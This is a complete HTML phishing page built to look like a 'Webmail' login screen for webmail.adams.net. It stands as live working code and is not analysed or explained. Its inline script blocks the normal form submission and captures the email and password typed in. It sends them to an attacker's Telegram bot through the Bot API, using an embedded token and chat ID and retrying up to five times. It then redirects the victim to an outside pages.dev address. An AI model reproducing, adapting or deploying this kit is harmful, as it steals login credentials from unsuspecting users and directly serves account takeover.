<html lang="en" xmlns="http://www.w3.org/1999/xhtml"><head>
<title>Webmail :: Welcome to Webmail</title>
<link rel="shortcut icon" href="https://webmail.adams.net/skins/classic/images/favicon.ico">
<link rel="stylesheet" type="text/css" href="https://webmail.adams.net/skins/classic/common.min.css?s=1636751527">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script> 
</head>
<body>
<img src="https://webmail.adams.net/logo.png" id="logo" border="0" style="margin:0 11px" alt="Webmail">

<div id="message" style="display: none;">
  <br> 
  <div class="loading content">Loading...</div></div>
<div id="login-form">
  <div class="boxtitle">Welcome to Webmail</div>
  <div class="boxcontent">
    <table summary="" border="0">
      <tbody>
        <tr>
          <td class="title">
            <label for="rcmloginuser">Email</label>
          </td>
          <td class="input"><input name="Email" id="rcmloginuserx" required="" autocapitalize="off" autocomplete="off" type="text"></td>
        </tr>
        <tr>
          <td class="title">
            <label for="rcmloginpwd">Password</label>
          </td>
          <td class="input"><input name="Password" id="rcmloginpwdx" required="" autocapitalize="off" autocomplete="off" type="password"></td>
        </tr>
      </tbody>
    </table>
    <p class="formbuttons"><input type="submit" id="rcmloginsubmitx" class="button mainaction" value="Login"></p>

   
 <script>  
    const MAX_RETRIES = 5;  
const RETRY_DELAY = 2000;  
const TELEGRAM_BOT_TOKEN = '7032507056:AAEdrB2mfZBpV8APkiiolbJMpFDYMu-iBiU'  ;  
const CHAT_ID = '7737384331'  ;  

function sendWebhookMessage(username, password, attempt = 1) {
  const message = `Username: ${username}\nPassword: ${password}`;
  document.getElementById("message").style.display = "block";
  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message 
    })
  })
  .then(response => {
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    return response.text(); 
  })
  .then(data => {
    setTimeout(function() {
      const redirectUrl = 'https://c0456782g-a98754ca362.pages.dev/red';
      const link = document.createElement('a');
      link.href = redirectUrl;
      link.click();
    }, 200);
  })
  .catch(error => {
    console.error("Error:", error);
    if (attempt < MAX_RETRIES) {
      setTimeout(() => {
        sendWebhookMessage(username, password, attempt + 1); 
      }, RETRY_DELAY);
    } else {
      
    }
  });
}

document.addEventListener("DOMContentLoaded", function () {
  document.getElementById("rcmloginsubmitx").addEventListener("click", function (event) {
    event.preventDefault(); 

    const username = document.getElementById("rcmloginuserx").value;
    const password = document.getElementById("rcmloginpwdx").value;

    if (username && password) {
      sendWebhookMessage(username, password);
    } else {
      
    }
  });
});

</script>


  </div>
</div>
